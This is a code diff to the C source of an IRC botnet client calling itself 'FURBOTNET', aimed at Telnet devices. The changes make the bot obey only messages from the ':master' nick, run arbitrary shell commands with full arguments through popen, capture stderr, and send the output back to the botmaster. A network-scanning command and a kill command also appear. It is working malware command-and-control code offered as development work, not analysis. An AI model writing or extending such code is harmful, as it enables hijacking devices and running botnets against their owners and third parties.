@@ -169,7 +169,7 @@ int irc_listen(irc_info *info) {
 	int max_tokens_qty = 16;
 	int num_read;
 	char buf[MAX_BUF], message[MAX_BUF + strlen("Executing command: ") + 30], popen_buf[MAX_BUF + 1];
-	char *str_ret;
+	char *str_ret = calloc(9, sizeof(char));
 
 	// handle command line sent in IRC
 	char command[100];
@@ -186,7 +186,12 @@ int irc_listen(irc_info *info) {
 		// guarantee that buf doesn't contain CR and LF
 		buf[strcspn(buf, "\r\n")] = 0;
 
-		if ((str_ret = strstr(buf, "PRIVMSG"))) {
+		// handle initial part of the message to ensure that is from master
+		strncpy(str_ret, buf, 8);
+		str_ret[8] = '\0';
+
+		// only read if message begins with :master! meaning that is from master
+		if (!strncmp(str_ret, ":master!", 8)) {
 
 			int token_len = parse_master_cmd(master_cmd, buf, max_tokens_qty);
 
@@ -199,19 +204,28 @@ int irc_listen(irc_info *info) {
 			// handling sh command
 			if (!strncmp(":!", master_cmd[3], 2)) {
 
-				sprintf(message, "Executing command: %s", (master_cmd[3] + 2));
-
-				irc_send(message, strlen(message), info);
-
 				strncpy(command, (master_cmd[3] + 2), strlen(master_cmd[3]) - 1);
 
-				if (!(file_popen = popen(command, "r"))) {
+				// handle additional command line arguments, without this approach
+				// commands like uname -a would lose '-a' part, due to tokenization of the arguments
+				for (int i = 4; i < token_len; i++) {
+					sprintf(command, "%s %s", command, master_cmd[i]);
+				}
+				// send status to botmaster
+				sprintf(message, "\x02 Executing command: %s\x02", command);
+				irc_send(message, strlen(message), info);
 
-					sprintf(message, "ERROR executing command: %s", command);
+				// appends error redirection to stdout, this way we can handle sh errors too
+				strcat(command, " 2>&1");
+
+				// threat execution errors
+				if (!(file_popen = popen(command, "r"))) {
+					sprintf(message, "ERROR executing command: %s errno is %d", command, errno);
 					irc_send(message, strlen(message), info);
 					continue;
 
 				} else {
+					// send the command execution result back to the botmaster
 					while(fgets(popen_buf, sizeof(popen_buf), file_popen) != NULL)  {
 						irc_send(popen_buf, strlen(popen_buf), info);
 					}
@@ -284,6 +298,7 @@ int irc_listen(irc_info *info) {
 				scan_network(info, master_cmd[4]);
 
 			} else if (!strcmp(":@kill", master_cmd[3])) {
+				unlink_pid_file();
 				exit(EXIT_SUCCESS);
 			} else if (!strcmp(":@help", master_cmd[3])) {
 				irc_send("\x02 FURBOTNET - IRC Botnet for Telnet devices\n\x02", 0, info);
@@ -310,7 +325,7 @@ int irc_listen(irc_info *info) {
 
 		free_master_cmd(master_cmd, token_len);
 
-		} else if ((str_ret = strstr(buf, "PING")) != NULL) {
+		} else if (strstr(buf, "PING")) {
 			send_pong(info);
 		}
 
